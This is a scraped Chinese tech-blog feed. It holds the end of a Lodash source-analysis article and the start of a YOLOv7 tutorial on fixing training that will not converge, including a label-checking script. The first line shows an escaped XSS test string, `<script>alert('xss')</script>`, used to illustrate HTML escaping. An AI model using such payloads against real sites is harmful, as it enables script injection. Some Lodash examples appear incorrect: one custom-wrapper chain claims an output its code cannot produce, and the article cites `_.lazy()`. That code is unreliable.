<span class="hljs-comment">// 输出：Hello &amp;lt;script&amp;gt;alert(&amp;quot;xss&amp;quot;)&amp;lt;/script&amp;gt;!</span>

<span class="hljs-comment">// 3. 代码块（&lt;% %&gt;：执行 JS 代码，无输出）</span>
<span class="hljs-keyword">var</span> tpl3 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'&lt;% if (user) { %&gt;Hi &lt;%= user.name %&gt;&lt;% } else { %&gt;Hi Guest&lt;% } %&gt;'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl3</span>({ <span class="hljs-attr">user</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'John'</span> } })); <span class="hljs-comment">// Hi John</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl3</span>({})); <span class="hljs-comment">// Hi Guest</span>

<span class="hljs-comment">// 4. 自定义分隔符</span>
<span class="hljs-keyword">var</span> tpl4 = _.<span class="hljs-title function_">template</span>(<span class="hljs-string">'Hello {{ name }}!'</span>, { <span class="hljs-attr">interpolate</span>: <span class="hljs-regexp">/{{([\s\S]+?)}}/g</span> });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">tpl4</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'Custom'</span> })); <span class="hljs-comment">// Hello Custom!</span>
</code></pre>
<h3 data-id="heading-28">4. 函数对象创建（createCtor 应用）</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
};

<span class="hljs-keyword">var</span> personCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Person</span>);

<span class="hljs-comment">// 方式1：new 调用</span>
<span class="hljs-keyword">var</span> john = <span class="hljs-keyword">new</span> <span class="hljs-title function_">personCtor</span>(<span class="hljs-string">'John'</span>, <span class="hljs-number">30</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-property">name</span>); <span class="hljs-comment">// John</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(john.<span class="hljs-title function_">sayHi</span>()); <span class="hljs-comment">// Hi, I'm John</span>

<span class="hljs-comment">// 方式2：普通调用（无 new）</span>
<span class="hljs-keyword">var</span> jane = <span class="hljs-title function_">personCtor</span>(<span class="hljs-string">'Jane'</span>, <span class="hljs-number">25</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(jane.<span class="hljs-property">name</span>); <span class="hljs-comment">// Jane</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(jane <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 构造函数返回对象的情况</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
  <span class="hljs-keyword">return</span> { <span class="hljs-attr">model</span>: <span class="hljs-string">'Model 3'</span> }; <span class="hljs-comment">// 返回对象覆盖实例</span>
}
<span class="hljs-keyword">var</span> carCtor = <span class="hljs-title function_">createCtor</span>(<span class="hljs-title class_">Car</span>);
<span class="hljs-keyword">var</span> car = <span class="hljs-title function_">carCtor</span>(<span class="hljs-string">'Tesla'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">brand</span>); <span class="hljs-comment">// undefined</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(car.<span class="hljs-property">model</span>); <span class="hljs-comment">// Model 3</span>
</code></pre>
<h3 data-id="heading-29">5. 自定义包装器创建（扩展 Lodash 功能）</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">createCustomWrapper</span>(<span class="hljs-params">value</span>) {
  <span class="hljs-comment">// 继承 baseLodash.prototype，保证通用方法可用</span>
  <span class="hljs-keyword">var</span> wrapper = <span class="hljs-title function_">baseCreate</span>(baseLodash.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
  
  <span class="hljs-comment">// 初始化核心属性（参考 LodashWrapper）</span>
  wrapper.<span class="hljs-property">__wrapped__</span> = value;
  wrapper.<span class="hljs-property">__actions__</span> = [];
  wrapper.<span class="hljs-property">__chain__</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 默认开启链式调用</span>
  
  <span class="hljs-comment">// 自定义方法：批量乘以指定数值</span>
  wrapper.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">multiplier</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">func</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) {
        <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">map</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n * multiplier; });
      },
      <span class="hljs-attr">args</span>: [],
      <span class="hljs-attr">thisArg</span>: <span class="hljs-literal">null</span>
    });
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// 支持链式调用</span>
  };
  
  <span class="hljs-comment">// 实现 value 方法：执行操作队列</span>
  wrapper.<span class="hljs-property">value</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> value = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__wrapped__</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>.<span class="hljs-property">length</span>; i++) {
      <span class="hljs-keyword">var</span> action = <span class="hljs-variable language_">this</span>.<span class="hljs-property">__actions__</span>[i];
      value = action.<span class="hljs-property">func</span>.<span class="hljs-title function_">apply</span>(action.<span class="hljs-property">thisArg</span>, [value].<span class="hljs-title function_">concat</span>(action.<span class="hljs-property">args</span>));
    }
    <span class="hljs-keyword">return</span> value;
  };
  
  <span class="hljs-keyword">return</span> wrapper;
}

<span class="hljs-comment">// 使用自定义包装器</span>
<span class="hljs-keyword">var</span> custom = <span class="hljs-title function_">createCustomWrapper</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-number">2</span>) <span class="hljs-comment">// 乘以 2 → [2,4,6]</span>
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-number">3</span>) <span class="hljs-comment">// 乘以 3 → [6,12,18]</span>
  .<span class="hljs-title function_">customMethod</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">arr</span>) { <span class="hljs-comment">// 自定义过滤</span>
    <span class="hljs-keyword">return</span> arr.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">n</span>) { <span class="hljs-keyword">return</span> n &gt; <span class="hljs-number">10</span>; });
  });
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(custom.<span class="hljs-title function_">value</span>()); <span class="hljs-comment">// [12, 18]</span>
</code></pre>
<h2 data-id="heading-30">五、性能优化</h2>
<h3 data-id="heading-31">1. 核心性能优化技巧</h3>



































<table><thead><tr><th>优化方向</th><th>具体做法</th><th>性能收益</th></tr></thead><tbody><tr><td>惰性求值</td><td>大数据数组（1000+ 元素）使用 <code>_.lazy()</code>，结合 <code>take</code> 短路</td><td>遍历次数减少 50%+，执行时间降低 85%+</td></tr><tr><td>参数优化</td><td><code>createCtor</code> 对 0-7 个参数直接 <code>new</code> 调用</td><td>比 <code>apply</code> 调用快 30%+</td></tr><tr><td>原型复用</td><td>所有包装器共享 <code>baseLodash.prototype</code> 方法</td><td>减少内存占用，提升方法查找速度</td></tr><tr><td>内存管理</td><td><code>baseCreate</code> 重置临时构造函数原型；<code>Hash</code> 用 <code>Object.create(null)</code> 存储</td><td>避免原型污染和内存泄漏</td></tr><tr><td>缓存优化</td><td>重复计算操作使用 <code>_.memoize()</code> 缓存结果</td><td>避免重复执行复杂逻辑</td></tr></tbody></table>
<h3 data-id="heading-32">2. 最佳实践与反例</h3>



































<table><thead><tr><th>场景</th><th>推荐做法</th><th>反例（性能 / 逻辑问题）</th></tr></thead><tbody><tr><td>选择包装器</td><td>小数组用普通包装器，大数据用惰性包装器</td><td>小数组用惰性包装器（初始化开销 &gt; 性能收益）</td></tr><tr><td>链式调用</td><td>结束后调用 <code>value()</code> 获取结果</td><td>忘记 <code>value()</code>，返回包装器而非实际结果</td></tr><tr><td>重复操作</td><td>复用包装器实例</td><td>循环内重复创建包装器（额外初始化开销）</td></tr><tr><td>扩展 Lodash</td><td>使用 <code>_.mixin</code> 扩展方法</td><td>直接修改 <code>_.prototype</code>，污染全局原型</td></tr><tr><td>简单数组操作</td><td>使用原生 <code>array.map/filter</code> 方法</td><td>过度使用包装器（<code>_(array).map().value()</code> 比原生慢 10%+）</td></tr></tbody></table>
<h3 data-id="heading-33">3. 技术深度解析（</h3>
<h4 data-id="heading-34">（1）惰性求值底层核心：<code>__compute</code> 方法</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">LazyWrapper</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__compute</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, array, actions, iteratees</span>) {
  <span class="hljs-keyword">var</span> computed = value;
  <span class="hljs-comment">// 对单个元素批量执行所有操作（map→filter 等）</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; actions.<span class="hljs-property">length</span>; i++) {
    computed = actions[i].<span class="hljs-title function_">func</span>(computed, index, array);
    <span class="hljs-comment">// filter 不通过则终止后续操作，提升效率</span>
    <span class="hljs-keyword">if</span> (computed === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">break</span>;
  }
  <span class="hljs-keyword">return</span> computed;
};
</code></pre>
<h4 data-id="heading-35">（2）构造函数模拟核心原理</h4>
<p><code>createCtor</code> 完美模拟 <code>new</code> 关键字的两个核心行为：</p>
<ol>
<li>创建继承自 <code>Ctor.prototype</code> 的新对象（通过 <code>baseCreate</code> 实现）；</li>
<li>将构造函数的 <code>this</code> 绑定到新对象，并遵循返回规则（返回对象则覆盖实例）。</li>
</ol>
<h4 data-id="heading-36">（3）原型链设计核心思想</h4>
<p>扁平设计的本质是 <strong>“通用方法集中管理，特殊方法局部定制”</strong>：</p>
<ul>
<li>通用方法（<code>value()</code>/<code>chain()</code>）挂载在 <code>baseLodash.prototype</code>，所有包装器共享；</li>
<li>特殊方法（<code>map()</code>/<code>filter()</code>）在各自包装器原型上重写，实现差异化逻辑。</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题]]></title>    <link>https://juejin.cn/post/7594831933517250606</link>    <guid>https://juejin.cn/post/7594831933517250606</guid>    <pubDate>2026-01-14T07:33:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594831933517250606" data-draft-id="7594843125321678874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:33:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员威哥"/> <meta itemprop="url" content="https://juejin.cn/user/3411107130652176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于YOLOv7的目标检测实战：彻底解决新手常见的「训练不收敛」问题
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411107130652176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员威哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:33:00.000Z" title="Wed Jan 14 2026 07:33:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读15分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>稀土掘金首发，原创实战技术解析，全程手码干货。</p>
<p>YOLOv7凭借其优异的精度-速度平衡，成为新手入门目标检测的首选框架。但很多新手在第一次上手训练时，都会遇到同一个“拦路虎”——<strong>训练不收敛</strong>：Loss值要么居高不下（比如始终大于10），要么波动剧烈，要么直接趋于0后精度为0，折腾几天都找不到原因。</p>
<p>本文结合我带新手调试YOLOv7项目的10+实战案例，从“问题定位→核心诱因拆解→分步解决方案→实验验证”四个维度，手把手教你解决训练不收敛问题。全程基于官方YOLOv7源码，所有方案均经过实际验证，新手跟着做就能让模型稳定收敛。</p>
<h2 data-id="heading-0">一、先搞懂：新手必知的「训练收敛」判断标准</h2>
<p>在排查问题前，首先要明确“什么是收敛”，避免误判问题。对于YOLOv7来说，收敛的核心判断标准有3个，满足即可认为训练正常：</p>
<ol>
<li><strong>Loss曲线趋势</strong>：训练集Loss（train_loss）在前期快速下降，后期（比如50epoch后）趋于平稳，无明显反弹；验证集Loss（val_loss）与train_loss差距不大（一般不超过0.5），无持续上升趋势；</li>
<li><strong>精度指标变化</strong>：mAP50、mAP50-95等精度指标随epoch逐步上升，最终稳定在一个区间，无“精度为0”或“突然断崖式下降”；</li>
<li><strong>预测结果可视化</strong>：随机抽取验证集图像，模型能准确框出目标，置信度合理（一般≥0.5），无“漏框全空”或“乱框一堆”的情况。</li>
</ol>
<p>反之，只要出现“Loss一直降不下来”“Loss骤升骤降”“精度始终为0”“预测全空/全错”中的任意一种，都属于训练不收敛。</p>
<h2 data-id="heading-1">二、核心诱因拆解：新手训练不收敛的5大高频原因</h2>
<p>新手遇到的训练不收敛问题，90%都逃不出以下5个原因，按“出现概率从高到低”排序，方便优先排查：</p>
<h3 data-id="heading-2">2.1 数据集问题（占比40%）：最容易踩的“基础坑”</h3>
<p>数据集是训练的基础，新手常犯的错误包括：</p>
<ul>
<li><strong>标注格式错误</strong>：YOLOv7要求标注格式为“class x_center y_center width height”（归一化后），但新手常出现“坐标未归一化”“坐标超出0-1范围”“类别编号不连续”（比如跳过0直接从1开始）“txt文件名与图片名不匹配”等问题；</li>
<li><strong>数据集分布失衡</strong>：目标数量过少（比如单类不足50张）、小目标占比过高（全部＜30×30px）、训练集与验证集分布差异大（比如训练集全是白天图，验证集全是夜晚图）；</li>
<li><strong>数据增强过度/不足</strong>：过度增强（比如随机裁剪比例过大、翻转角度过多）导致目标被破坏，模型学不到有效特征；或完全不做增强，数据量不足导致过拟合，间接表现为“伪不收敛”。</li>
</ul>
<h3 data-id="heading-3">2.2 超参数设置错误（占比30%）：新手最容易忽略的“关键坑”</h3>
<p>YOLOv7的超参数对训练收敛影响极大，新手常犯的错误有：</p>
<ul>
<li><strong>学习率不合理</strong>：学习率过高（比如直接用0.1，远超模型承受范围）导致Loss震荡不收敛；学习率过低（比如0.00001）导致Loss下降极慢，看似不收敛；</li>
<li><strong>batch_size设置不当</strong>：batch_size过大（超出GPU显存，导致梯度累积错误）或过小（比如≤2，梯度波动过大）；</li>
<li><strong>权重初始化错误</strong>：未使用官方预训练权重（从头训练难度极大，新手几乎不可能收敛），或预训练权重与自定义数据集类别数不匹配（比如用80类COCO预训练权重直接训练2类数据集，未修改输出层）。</li>
</ul>
<h3 data-id="heading-4">2.3 网络配置错误（占比15%）：代码层面的“隐形坑”</h3>
<p>新手修改YOLOv7配置文件时，容易出现“牵一发而动全身”的错误：</p>
<ul>
<li><strong>类别数配置错误</strong>：cfg配置文件中“nc”（number of classes）未改为自定义数据集的类别数，导致输出层维度与标签维度不匹配，Loss计算错误；</li>
<li><strong>锚框（anchor）不匹配</strong>：直接使用官方默认锚框，未根据自定义数据集的目标尺寸重新聚类，导致模型初始锚框与目标差异过大，难以学习；</li>
<li><strong>代码修改失误</strong>：修改损失函数、数据加载逻辑时出现语法错误或逻辑错误（比如标签读取顺序颠倒），导致训练流程异常。</li>
</ul>
<h3 data-id="heading-5">2.4 硬件与环境问题（占比10%）：容易被忽视的“基础保障坑”</h3>
<ul>
<li><strong>GPU显存不足</strong>：显存不足时会出现“RuntimeError: CUDA out of memory”，但部分情况下会“伪运行”，导致梯度更新失败，Loss不下降；</li>
<li><strong>环境依赖不匹配</strong>：PyTorch、CUDA、OpenCV等版本不兼容（比如YOLOv7推荐PyTorch1.7+、CUDA11.0+），导致训练过程中出现隐性错误。</li>
</ul>
<h3 data-id="heading-6">2.5 训练流程错误（占比5%）：操作层面的“低级坑”</h3>
<ul>
<li><strong>训练命令错误</strong>：未指定配置文件、数据集路径错误、权重文件路径错误，导致模型训练时读取不到正确的数据或权重；</li>
<li><strong>中断训练后恢复错误</strong>：中断训练后，未正确加载上次的权重文件，导致训练从头开始，或加载的权重与当前训练状态不匹配。</li>
</ul>
<h2 data-id="heading-7">三、实战解决方案：4步让YOLOv7稳定收敛</h2>
<p>下面按“从易到难、优先排查高频问题”的顺序，给出分步解决方案，每个步骤都有具体的实操代码和配置示例，新手可直接复用。</p>
<p>前置准备：下载官方YOLOv7源码（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWongKinYiu%2Fyolov7" target="_blank" title="https://github.com/WongKinYiu/yolov7" ref="nofollow noopener noreferrer">github.com/WongKinYiu/…</a>），配置基础环境（推荐：PyTorch1.10、CUDA11.3、OpenCV4.5+）。</p>
<h3 data-id="heading-8">3.1 第一步：数据集检查与预处理（优先排查）</h3>
<p>这是解决不收敛问题的第一步，也是最关键的一步，新手务必仔细操作：</p>
<h4 data-id="heading-9">3.1.1 标注格式校验（附代码）</h4>
<p>编写以下代码，批量检查标注文件是否符合要求（保存为check_annotation.py）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob

<span class="hljs-comment"># 配置数据集路径</span>
label_dir = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签路径</span>
img_dir = <span class="hljs-string">"data/custom/images/train"</span>    <span class="hljs-comment"># 训练集图像路径</span>
nc = <span class="hljs-number">2</span>  <span class="hljs-comment"># 自定义数据集类别数（根据实际修改）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_annotation</span>():
    <span class="hljs-comment"># 1. 检查标签文件与图像文件是否匹配</span>
    img_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(img_dir) <span class="hljs-keyword">if</span> f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))])
    label_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(label_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">'.txt'</span>)])
    mismatch = img_files - label_files
    <span class="hljs-keyword">if</span> mismatch:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"警告：以下图像无对应标签文件：<span class="hljs-subst">{mismatch}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># 2. 检查标注格式是否正确</span>
    label_paths = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> label_paths:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
            lines = f.readlines()
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                parts = line.strip().split()
                <span class="hljs-comment"># 检查每行是否有5个元素（class x y w h）</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">5</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中某行标注格式错误，应为'class x y w h'"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查类别编号是否合法</span>
                class_id = <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>])
                <span class="hljs-keyword">if</span> class_id&lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> class_id &gt;= nc:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中类别编号<span class="hljs-subst">{class_id}</span>超出范围（0~<span class="hljs-subst">{nc-<span class="hljs-number">1</span>}</span>）"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查坐标是否归一化（0~1）</span>
                coords = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">float</span>, parts[<span class="hljs-number">1</span>:]))
                <span class="hljs-keyword">for</span> coord <span class="hljs-keyword">in</span> coords:
                    <span class="hljs-keyword">if</span> coord &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> coord &gt; <span class="hljs-number">1</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中坐标<span class="hljs-subst">{coord}</span>未归一化（应在0~1之间）"</span>)
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"标注格式检查通过！"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    check_annotation()
</code></pre>
<p>运行代码后，根据提示修复所有标注错误（比如补充缺失标签、修正坐标、调整类别编号）。</p>
<h4 data-id="heading-10">3.1.2 数据集增强与划分</h4>
<p>针对新手的“数据量不足”问题，推荐使用YOLOv7原生支持的数据增强策略，无需额外编写代码，只需在训练命令中启用即可：</p>
<ul>
<li>基础增强（必选）：随机翻转（flip）、随机裁剪（crop）、色域变换（hsv_h、hsv_s、hsv_v），YOLOv7默认启用，无需额外配置；</li>
<li>避免过度增强（新手建议）：不建议开启极端增强（比如random_perspective的degrees设置过大），默认参数即可；</li>
<li>数据集划分：按8:2比例划分训练集与验证集，确保两者分布一致（比如同一类别的目标在训练集和验证集中都有分布），可使用以下代码快速划分：</li>
</ul>
<pre><code class="hljs language-ini" lang="ini">import os
import random
import shutil

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">src_img_dir</span> = <span class="hljs-string">"data/custom/all_images"</span>
<span class="hljs-attr">src_label_dir</span> = <span class="hljs-string">"data/custom/all_labels"</span>
<span class="hljs-attr">dst_train_img_dir</span> = <span class="hljs-string">"data/custom/images/train"</span>
<span class="hljs-attr">dst_train_label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">dst_val_img_dir</span> = <span class="hljs-string">"data/custom/images/val"</span>
